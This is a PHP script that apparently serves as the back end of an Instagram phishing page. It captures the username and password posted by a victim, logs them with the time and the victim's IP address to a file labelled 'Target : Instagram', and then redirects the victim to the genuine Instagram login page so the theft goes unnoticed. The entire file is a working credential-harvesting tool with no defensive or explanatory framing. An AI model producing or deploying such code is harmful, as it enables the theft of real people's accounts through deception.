<?php

$user = $_POST['user'] ?? 'Not Provided';
$pass = $_POST['pass'] ?? 'Not Provided';

$log = "---------------------------\n";
$log .= "Target : Instagram\n";
$log .= "Username : $user\n";
$log .= "Password : $pass\n";
$log .= "Time : " . date("Y-m-d H:i:s") . "\n";
$log .= "IP : " . $_SERVER['REMOTE_ADDR'] . "\n";
$log .= "---------------------------\n\n";

file_put_contents("../../logs/output.txt", $log, FILE_APPEND);

/*
Redirect to real site
*/

header("Location: https://www.instagram.com/accounts/login/");
exit();

?>